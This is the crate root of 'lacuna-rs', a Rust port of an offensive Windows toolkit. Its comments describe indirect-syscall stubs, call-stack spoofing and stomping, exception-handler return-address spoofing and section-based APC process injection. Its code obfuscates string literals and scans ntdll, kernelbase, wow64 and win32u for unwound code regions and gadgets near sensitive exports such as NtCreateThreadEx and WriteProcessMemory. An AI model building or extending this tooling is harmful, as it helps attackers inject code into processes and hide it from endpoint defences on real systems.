//
// lib.rs — lacuna-rs crate root
//
// LACUNA Chain ported to a reusable Rust crate.
//
// This crate provides the same primitives as the original `lacuna_chain.c`:
//
//   * PE parsing (section lookup, export resolution)
//   * .pdata ghost-region scanning (executable code with no
//     RUNTIME_FUNCTION coverage)
//   * SSN resolution + per-function `syscall;ret` targeting
//   * JIT indirect-syscall stub emission (with optional ghost-gadget
//     redirect)
//   * LACUNA ghost-frame chain construction + stack stomp
//   * Vectored exception handlers for parameter encryption and
//     return-address spoofing
//   * Section-based APC injection (NtCreateSection + MapView×2)
//
// ## Feature flags
//
//   * `inject`     — enable `inject::inject_sapc`.
//   * `stack-spoof`— enable `chain` module (ghost-frame chain + stomp).
//                    Requires frame pointers; see `build.rs`.
//   * `veh`        — enable `veh` module (hardware-breakpoint parameter
//                    encryption + return-address spoofing).
//
// When no features are enabled, only the scanning/PE/NT layers are
// available — useful for reconnaissance without pulling in the
// offensive primitives.
//

#![allow(dead_code)]
#![allow(non_snake_case)]
#![allow(non_upper_case_globals)]

// ── litcrypt2 string obfuscation ─────────────────────────────────────────────
// Encrypts string literals at compile time; they are decrypted at runtime
// inside the `lc!()` macro.  The encryption key is read from the
// `LITCRYPT_ENCRYPT_KEY` environment variable; if unset, litcrypt2
// auto-generates a random key at compile time.
#[macro_use]
extern crate litcrypt2;
// litcrypt2's `use_litcrypt!()` macro expands to code that references
// `alloc::vec::Vec` and `alloc::string::String`, so we link the `alloc`
// crate explicitly.
extern crate alloc;
use_litcrypt!();

// ── Module wiring ────────────────────────────────────────────────────────────

pub mod win;
pub mod pe;
pub mod scan;
pub mod nt;
pub mod stub;

#[cfg(feature = "veh")]
pub mod veh;

#[cfg(feature = "stack-spoof")]
pub mod chain;

#[cfg(feature = "inject")]
pub mod inject;

// ── Crate-level re-exports ───────────────────────────────────────────────────

pub use win::nt_ok;

// ── Version ──────────────────────────────────────────────────────────────────

pub const VERSION: &str = env!("CARGO_PKG_VERSION");

// ── Convenience: one-shot scan ───────────────────────────────────────────────

/// Scan all four target modules (ntdll, kernelbase, wow64, win32u) for
/// ghost regions and gadgets, returning a summary.
///
/// This is the Rust analogue of the C `do_scan()` function.
pub fn scan_all() -> ScanSummary {
    let modules: &[(&[u8], &[&[u8]])] = &[
        (
            b"ntdll.dll\0",
            &[
                b"NtAllocateVirtualMemory\0",
                b"NtCreateThreadEx\0",
                b"RtlCreateUserThread\0",
                b"LdrLoadDll\0",
                b"RtlUserThreadStart\0",
            ],
        ),
        (
            b"kernelbase.dll\0",
            &[
                b"VirtualProtect\0",
                b"VirtualAllocEx\0",
                b"WriteProcessMemory\0",
                b"CreateRemoteThreadEx\0",
            ],
        ),
        (
            b"wow64.dll\0",
            &[
                b"Wow64PrepareForException\0",
                b"Wow64KiUserCallbackDispatcher\0",
                b"Wow64ApcRoutine\0",
            ],
        ),
        (
            b"win32u.dll\0",
            &[
                b"NtGdiDdDDICreateDevice\0",
                b"NtUserCallNoParam\0",
            ],
        ),
    ];

    let mut summary = ScanSummary::default();

    for &(mod_name, targets) in modules {
        let m = win::get_module(mod_name);
        if m.is_null() {
            continue;
        }
        let mut buf = [scan::Ghost {
            va_start: 0,
            va_end: 0,
            size: 0,
            export_va: 0,
            dist: 0,
            name: [0; 64],
        }; 512];
        let n = scan::scan_ghosts(m, targets, &mut buf);

        let mut gg = [scan::GhostGadget { va: 0, parent: [0; 64] }; 32];
        let ngg = scan::scan_ghost_gadgets(&buf[..n], mod_name, &mut gg);

        summary.modules.push(ScanModule {
            name: trim_cstr(mod_name).to_string(),
            ghost_count: n,
            gadget_count: ngg,
            first_ghost: if n > 0 {
                Some((buf[0].va_start, buf[0].va_end, buf[0].size))
            } else {
                None
            },
            win32u_nop_gap: if mod_name.starts_with(b"win32u") {
                scan::win32u_nop_gap(m)
            } else {
                0
            },
        });
    }

    summary
}

/// Trim a NUL-terminated byte slice to the bytes before the first NUL.
fn trim_cstr(s: &[u8]) -> &str {
    let n = s.iter().position(|&b| b == 0).unwrap_or(s.len());
    core::str::from_utf8(&s[..n]).unwrap_or("?")
}

// ── Scan summary types ───────────────────────────────────────────────────────

#[derive(Default)]
pub struct ScanSummary {
    pub modules: Vec<ScanModule>,
}

pub struct ScanModule {
    pub name: String,
    pub ghost_count: usize,
    pub gadget_count: usize,
    pub first_ghost: Option<(u64, u64, u32)>,
    pub win32u_nop_gap: u64,
}